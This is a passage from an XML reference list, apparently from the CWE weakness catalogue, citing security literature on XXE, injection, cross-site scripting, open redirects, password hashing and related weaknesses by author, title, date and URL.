			<Title>Exploitable Redirects on the Web: Identification, Prevalence, and Defense</Title>
			<URL>http://www.cs.indiana.edu/cgi-pub/cshue/research/woot08.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-484">
			<Author>Russ McRee</Author>
			<Title>Open redirect vulnerabilities: definition and prevention</Title>
			<Edition>Issue 17</Edition>
			<Publication>(IN)SECURE</Publication>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-485">
			<Author>Jason Lam</Author>
			<Title>Top 25 Series - Rank 23 - Open Redirect</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---25</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-496">
			<Author>OWASP</Author>
			<Title>XML External Entity (XXE) Processing</Title>
			<URL>https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-497">
			<Author>Sascha Herzog</Author>
			<Title>XML External Entity Attacks (XXE)</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-498">
			<Author>Gregory Steuck</Author>
			<Title>XXE (Xml eXternal Entity) Attack</Title>
			<URL>http://www.securiteam.com/securitynews/6D0100A5PU.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-499">
			<Author>WASC</Author>
			<Title>XML External Entities (XXE) Attack</Title>
			<URL>http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-500">
			<Author>Bryan Sullivan</Author>
			<Title>XML Denial of Service Attacks and Defenses</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<URL>http://msdn.microsoft.com/en-us/magazine/ee335713.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-501">
			<Author>Chris Cornutt</Author>
			<Title>Preventing XXE in PHP</Title>
			<URL>http://websec.io/2012/08/27/Preventing-XXE-in-PHP.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-528">
			<Author>OWASP</Author>
			<Title>Top 10 2007-Insecure Direct Object Reference</Title>
			<Publication_Year>2007</Publication_Year>
			<URL>http://www.owasp.org/index.php/Top_10_2007-A4</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-529">
			<Title>HMAC</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---18</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>http://en.wikipedia.org/wiki/Hmac</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-531">
			<Author>Web Application Security Consortium</Author>
			<Title>XPath Injection</Title>
			<URL>http://www.webappsec.org/projects/threat/classes/xpath_injection.shtml</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-535">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Separation of Privilege</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/separation-of-privilege</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-542">
			<Author>Jon Postel, Editor</Author>
			<Title>RFC: 793, TRANSMISSION CONTROL PROTOCOL</Title>
			<Publication_Year>1981</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publisher>Information Sciences Institute</Publisher>
			<URL>http://www.ietf.org/rfc/rfc0793.txt</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-544">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Never Assuming that Your Secrets Are Safe</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/never-assuming-that-your-secrets-are-safe</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-546">
			<Author>Sean Barnum</Author>
			<Author>Michael Gegick</Author>
			<Title>Design Principles</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<URL>https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/design-principles</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-631">
			<Author>OWASP</Author>
			<Title>Password Storage Cheat Sheet</Title>
			<URL>https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-632">
			<Author>Thomas Ptacek</Author>
			<Title>Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://www.securityfocus.com/blogs/262</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-633">
			<Author>Robert Graham</Author>
			<Title>The Importance of Being Canonical</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---02</Publication_Day>
			<URL>http://erratasec.blogspot.com/2009/02/importance-of-being-canonical.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-634">
			<Author>James McGlinn</Author>
			<Title>Password Hashing</Title>
			<URL>http://phpsec.org/articles/2005/password-hashing.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-635">
			<Author>Jeff Atwood</Author>
			<Title>Rainbow Hash Cracking</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>http://www.codinghorror.com/blog/archives/000949.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-636">
			<Author>Jeff Atwood</Author>
			<Title>Speed Hashing</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--04</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>http://www.codinghorror.com/blog/2012/04/speed-hashing.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-637">
			<Title>Rainbow table</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---03</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>http://en.wikipedia.org/wiki/Rainbow_table</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-667">
			<Author>Rafal Los</Author>
			<Title>Real-Life Example of a 'Business Logic Defect' (Screen Shots!)</Title>
			<Publication_Year>2011</Publication_Year>
			<URL>http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-676">
			<Author>Amit Klein</Author>
			<Title>Multiple vendors XML parser (and SOAP/WebServices server) Denial of Service attack using DTD</Title>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---16</Publication_Day>
			<URL>http://www.securityfocus.com/archive/1/303509</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-677">
			<Author>Rami Jaamour</Author>
			<Title>XML security: Preventing XML bombs</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>http://searchsoftwarequality.techtarget.com/expert/KnowledgebaseAnswer/0,289625,sid92_gci1168442,00.html?asrc=SS_CLA_302%20%20558&amp;psrc=CLT_92#</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-678">
			<Author>Didier Stevens</Author>
			<Title>Dismantling an XML-Bomb</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---23</Publication_Day>
			<URL>http://blog.didierstevens.com/2008/09/23/dismantling-an-xml-bomb/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-679">
			<Author>Robert Auger</Author>
			<Title>XML Entity Expansion</Title>
			<URL>http://projects.webappsec.org/XML-Entity-Expansion</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-680">
			<Author>Elliotte Rusty Harold</Author>
			<Title>Tip: Configure SAX parsers for secure processing</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---27</Publication_Day>
			<URL>http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-682">
			<Author>Blaise Doughan</Author>
			<Title>Preventing Entity Expansion Attacks in JAXB</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---11</Publication_Day>
			<URL>http://blog.bdoughan.com/2011/03/preventing-entity-expansion-attacks-in.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-685">
			<Author>Pascal Meunier</Author>
			<Title>Meta-Character Vulnerabilities</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---20</Publication_Day>
			<URL>http://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-686">
			<Author>Robert Auger</Author>
			<Title>OS Commanding</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--06</Publication_Month>
			<URL>http://projects.webappsec.org/OS-Commanding</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-687">
			<Author>Lincoln Stein</Author>
			<Author>John Stewart</Author>
			<Title>The World Wide Web Security FAQ</Title>
			<Publication_Year>2002</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---04</Publication_Day>
			<URL>http://www.w3.org/Security/Faq/wwwsf4.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-688">
			<Author>Jordan Dimov, Cigital</Author>
			<Title>Security Issues in Perl Scripts</Title>
			<URL>http://www.cgisecurity.com/lib/sips.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-690">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 9 - OS Command Injection</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---24</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/02/24/top-25-series-rank-9-os-command-injection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-694">
			<Author>Ronald L. Rivest</Author>
			<Author>Burt Kaliski</Author>
			<Title>RSA Problem</Title>
			<Publication_Year>2003</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://people.csail.mit.edu/rivest/RivestKaliski-RSAProblem.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-695">
			<Title>Optimal Asymmetric Encryption Padding</Title>
			<Publication_Year>2009</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>http://en.wikipedia.org/wiki/Optimal_Asymmetric_Encryption_Padding</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-706">
			<Author>Steve Christey</Author>
			<Title>Unforgivable Vulnerabilities</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---02</Publication_Day>
			<URL>http://cve.mitre.org/docs/docs-2007/unforgivable.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-709">
			<Author>Jeremiah Grossman</Author>
			<Author>Robert "RSnake" Hansen</Author>
			<Author>Petko "pdp" D. Petkov</Author>
			<Author>Anton Rager</Author>
			<Author>Seth Fogie</Author>
			<Title>XSS Attacks</Title>
			<Publication_Year>2007</Publication_Year>
			<Publisher>Syngress</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-712">
			<Title>Cross-site scripting</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<Publisher>Wikipedia</Publisher>
			<URL>http://en.wikipedia.org/wiki/Cross-site_scripting</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-714">
			<Author>RSnake</Author>
			<Title>XSS (Cross Site Scripting) Cheat Sheet</Title>
			<URL>http://ha.ckers.org/xss.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-715">
			<Author>Microsoft</Author>
			<Title>Mitigating Cross-site Scripting With HTTP-only Cookies</Title>
			<URL>http://msdn.microsoft.com/en-us/library/ms533046.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-716">
			<Author>Mark Curphey, Microsoft</Author>
			<Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!</Title>
			<URL>http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-718">
			<Author>Ivan Ristic</Author>
			<Title>XSS Defense HOWTO</Title>
			<URL>http://blog.modsecurity.org/2008/07/do-you-know-how.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-719">
			<Author>OWASP</Author>
			<Title>Web Application Firewall</Title>
			<URL>http://www.owasp.org/index.php/Web_Application_Firewall</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-720">
			<Author>Web Application Security Consortium</Author>
			<Title>Web Application Firewall Evaluation Criteria</Title>
			<URL>http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-721">
			<Author>RSnake</Author>
			<Title>Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---19</Publication_Day>
		</External_Reference>
      <External_Reference Reference_ID="REF-722">
			<Title>XMLHttpRequest allows reading HTTPOnly cookies</Title>
			<Publisher>Mozilla</Publisher>
			<URL>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-723">
			<Title>Apache Wicket</Title>
			<URL>http://wicket.apache.org/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-724">
			<Author>OWASP</Author>
			<Title>XSS (Cross Site Scripting) Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-725">
			<Author>OWASP</Author>
			<Title>DOM based XSS Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-726">
			<Author>Jason Lam</Author>
			<Title>Top 25 series - Rank 1 - Cross Site Scripting</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--02</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-729">
			<Author>Johannes Ullrich</Author>
			<Title>Top 25 Series - Rank 11 - Hardcoded Credentials</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/10/top-25-series-rank-11-hardcoded-credentials/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-731">
			<Author>Web Application Security Consortium</Author>
			<Title>Insufficient Anti-automation</Title>
			<URL>http://projects.webappsec.org/Insufficient+Anti-automation</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-754">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 6 - Reliance on Untrusted Inputs in a Security Decision</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/05/top-25-series-rank-6-reliance-on-untrusted-inputs-in-a-security-decision/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-756">
			<Author>Scott Mitchell</Author>
			<Title>Understanding ASP.NET View State</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<Publisher>Microsoft</Publisher>
			<URL>http://msdn.microsoft.com/en-us/library/ms972976.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-769">
			<Author>OWASP</Author>
			<Title>Top 10 2010-A9-Insufficient Transport Layer Protection</Title>
			<URL>http://www.owasp.org/index.php/Top_10_2010-A9-Insufficient_Transport_Layer_Protection</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-778">
			<Author>Jeremiah Grossman</Author>
			<Title>Third-Party Web Widget Security FAQ</Title>
			<URL>http://jeremiahgrossman.blogspot.com/2010/07/third-party-web-widget-security-faq.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-795">
			<Author>Jeremiah Grossman</Author>
			<Title>Business Logic Flaws and Yahoo Games</Title>
			<Publication_Year>2006</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---08</Publication_Day>
			<URL>http://jeremiahgrossman.blogspot.com/2006/12/business-logic-flaws.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-796">
			<Author>Jeremiah Grossman</Author>
			<Title>Seven Business Logic Flaws That Put Your Website At Risk</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<URL>http://www.whitehatsec.com/home/assets/WP_bizlogic092407.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-797">
			<Author>WhiteHat Security</Author>
			<Title>Business Logic Flaws</Title>
			<URL>http://www.whitehatsec.com/home/solutions/BL_auction.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-798">
			<Author>WASC</Author>
			<Title>Abuse of Functionality</Title>
			<URL>http://projects.webappsec.org/w/page/13246913/Abuse-of-Functionality</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-799">
			<Author>Rafal Los</Author>
			<Author>Prajakta Jagdale</Author>
			<Title>Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic</Title>
			<Publication_Year>2011</Publication_Year>
			<URL>http://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-801">
			<Author>Viktoria Felmetsger</Author>
			<Author>Ludovico Cavedon</Author>
			<Author>Christopher Kruegel</Author>
			<Author>Giovanni Vigna</Author>
			<Title>Toward Automated Detection of Logic Vulnerabilities in Web Applications</Title>
			<Publication>USENIX Security Symposium 2010</Publication>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--08</Publication_Month>
			<URL>http://www.usenix.org/events/sec10/tech/full_papers/Felmetsger.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-802">
			<Author>Faisal Nabi</Author>
			<Title>Designing a Framework Method for Secure Business Application Logic Integrity in e-Commerce Systems</Title>
			<Publication>International Journal of Network Security, Vol.12, No.1</Publication>
			<Publication_Year>2011</Publication_Year>
			<URL>http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-806">
			<Author>WASC</Author>
			<Title>Insufficient Process Validation</Title>
			<URL>http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-859">
			<Author>Steven Christey</Author>
			<Title>Argument injection issues</Title>
			<URL>http://www.securityfocus.com/archive/1/archive/1/460089/100/100/threaded</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-867">
			<Author>OWASP</Author>
			<Title>SQL Injection Prevention Cheat Sheet</Title>
			<URL>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-868">
			<Author>Steven Friedl</Author>
			<Title>SQL Injection Attacks by Example</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---10</Publication_Day>
			<URL>http://www.unixwiz.net/techtips/sql-injection.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-869">
			<Author>Ferruh Mavituna</Author>
			<Title>SQL Injection Cheat Sheet</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-870">
			<Author>David Litchfield</Author>
			<Author>Chris Anley</Author>
			<Author>John Heasman</Author>
			<Author>Bill Grindlay</Author>
			<Title>The Database Hacker's Handbook: Defending Database Servers</Title>
			<Publication_Year>2005</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<Publisher>Wiley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-871">
			<Author>David Litchfield</Author>
			<Title>The Oracle Hacker's Handbook: Hacking and Defending Oracle</Title>
			<Publication_Year>2007</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---30</Publication_Day>
			<Publisher>Wiley</Publisher>
		</External_Reference>
      <External_Reference Reference_ID="REF-872">
			<Author>Microsoft</Author>
			<Title>SQL Injection</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<URL>http://msdn.microsoft.com/en-us/library/ms161953.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-873">
			<Author>Microsoft Security Vulnerability Research &amp; Defense</Author>
			<Title>SQL Injection Attack</Title>
			<URL>http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-874">
			<Author>Michael Howard</Author>
			<Title>Giving SQL Injection the Respect it Deserves</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---15</Publication_Day>
			<URL>http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-875">
			<Author>Frank Kim</Author>
			<Title>Top 25 Series - Rank 2 - SQL Injection</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<Publisher>SANS Software Security Institute</Publisher>
			<URL>http://blogs.sans.org/appsecstreetfighter/2010/03/01/top-25-series-rank-2-sql-injection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-879">
			<Author>SPI Dynamics</Author>
			<Title>Web Applications and LDAP Injection</Title>
		</External_Reference>
      <External_Reference Reference_ID="REF-882">
			<Author>Amit Klein</Author>
			<Title>Blind XPath Injection</Title>
			<Publication_Year>2004</Publication_Year>
			<Publication_Month>--05</Publication_Month>
			<Publication_Day>---19</Publication_Day>
			<URL>http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-885">
			<Author>Stefan Esser</Author>
			<Title>Shocking News in PHP Exploitation</Title>
			<Publication_Year>2009</Publication_Year>
			<URL>http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-886">
			<Author>Dinis Cruz</Author>
			<Title>"Two Security Vulnerabilities in the Spring Framework's MVC" pdf (from 2008)</Title>
			<URL>http://blog.diniscruz.com/2011/07/two-security-vulnerabilities-in-spring.html</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-887">
			<Author>Ryan Berg</Author>
			<Author>Dinis Cruz</Author>
			<Title>Two Security Vulnerabilities in the Spring Framework's MVC</Title>
			<URL>http://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-888">
			<Author>ASPNETUE</Author>
			<Title>Best Practices for ASP.NET MVC</Title>
			<Publication_Year>2010</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---17</Publication_Day>
			<URL>http://blogs.msdn.com/b/aspnetue/archive/2010/09/17/second_2d00_post.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-889">
			<Author>Michael Hartl</Author>
			<Title>Mass assignment in Rails applications</Title>
			<Publication_Year>2008</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---21</Publication_Day>
			<URL>http://blog.mhartl.com/2008/09/21/mass-assignment-in-rails-applications/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-890">
			<Author>Tobi</Author>
			<Title>Secure your Rails apps!</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---06</Publication_Day>
			<URL>http://pragtob.wordpress.com/2012/03/06/secure-your-rails-apps/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-891">
			<Author>Heiko Webers</Author>
			<Title>Ruby On Rails Security Guide</Title>
			<URL>http://guides.rubyonrails.org/security.html#mass-assignment</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-892">
			<Author>Josh Bush</Author>
			<Title>Mass Assignment Vulnerability in ASP.NET MVC</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---05</Publication_Day>
			<URL>http://freshbrewedcode.com/joshbush/2012/03/05/mass-assignment-aspnet-mvc/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-893">
			<Author>K. Scott Allen</Author>
			<Title>6 Ways To Avoid Mass Assignment in ASP.NET MVC</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--03</Publication_Month>
			<Publication_Day>---12</Publication_Day>
			<URL>http://odetocode.com/blogs/scott/archive/2012/03/11/complete-guide-to-mass-assignment-in-asp-net-mvc.aspx</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-894">
			<Author>Egidio Romano</Author>
			<Title>PHP Object Injection</Title>
			<Publication_Year>2013</Publication_Year>
			<Publication_Month>--01</Publication_Month>
			<Publication_Day>---22</Publication_Day>
			<URL>https://www.owasp.org/index.php/PHP_Object_Injection</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-908">
			<Author>Solar Designer</Author>
			<Title>Password hashing at scale</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--10</Publication_Month>
			<Publication_Day>---01</Publication_Day>
			<URL>http://www.openwall.com/presentations/YaC2012-Password-Hashing-At-Scale/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-909">
			<Author>Solar Designer</Author>
			<Title>New developments in password hashing: ROM-port-hard functions</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<URL>http://www.openwall.com/presentations/ZeroNights2012-New-In-Password-Hashing/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-911">
			<Author>Stefano Di Paola</Author>
			<Author>Arshan Dabirsiaghi</Author>
			<Title>Expression Language Injection</Title>
			<Publication_Year>2011</Publication_Year>
			<Publication_Month>--09</Publication_Month>
			<Publication_Day>---12</Publication_Day>
			<URL>http://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-912">
			<Author>Dan Amodio</Author>
			<Title>Remote Code with Expression Language Injection</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--12</Publication_Month>
			<Publication_Day>---14</Publication_Day>
			<URL>http://danamodio.com/application-security/discoveries/spring-remote-code-with-expression-language-injection/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-913">
			<Author>Alexander Polyakov</Author>
			<Author>Dmitry Chastukhin</Author>
			<Title>SSRF vs. Business-critical applications: XXE tunneling in SAP</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--07</Publication_Month>
			<Publication_Day>---26</Publication_Day>
			<URL>https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-914">
			<Author>Alexander Polyakov</Author>
			<Author>Dmitry Chastukhin</Author>
			<Author>Alexey Tyurin</Author>
			<Title>SSRF vs. Business-critical Applications. Part 1: XXE Tunnelling in SAP NetWeaver</Title>
			<URL>http://erpscan.com/wp-content/uploads/2012/08/SSRF-vs-Businness-critical-applications-whitepaper.pdf</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-915">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 1</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
			<Publication_Day>---07</Publication_Day>
			<URL>https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/</URL>
		</External_Reference>
      <External_Reference Reference_ID="REF-916">
			<Author>Riyaz Ahemed Walikar</Author>
			<Title>Cross Site Port Attacks - XSPA - Part 2</Title>
			<Publication_Year>2012</Publication_Year>
			<Publication_Month>--11</Publication_Month>
